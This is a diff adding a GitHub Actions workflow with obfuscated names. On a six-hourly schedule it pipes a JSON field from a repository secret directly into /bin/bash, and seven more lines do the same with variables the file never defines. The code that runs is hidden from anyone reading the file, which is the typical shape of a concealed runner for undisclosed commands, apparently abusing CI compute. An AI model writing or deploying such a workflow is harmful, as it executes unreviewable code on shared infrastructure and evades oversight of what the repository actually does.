@@ -1,0 +1,24 @@
+name: rendejinglidianli
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: rendejinglidianli
+        env:
+          nbuz54: ${{ secrets.nbuz54 }}
+        run: |
+          echo $nbuz54 | jq -r .nvh868 | /bin/bash
+          echo $bycpu30 | jq -r .rkoff01747 | /bin/bash
+          echo $pyozk81101 | jq -r .sncz42699 | /bin/bash
+          echo $faldo8 | jq -r .ie44774 | /bin/bash
+          echo $jzbd4081 | jq -r .b51 | /bin/bash
+          echo $c993 | jq -r .nde4 | /bin/bash
+          echo $vb617 | jq -r .apn5648 | /bin/bash
+          echo $c5576 | jq -r .lf6 | /bin/bash
+
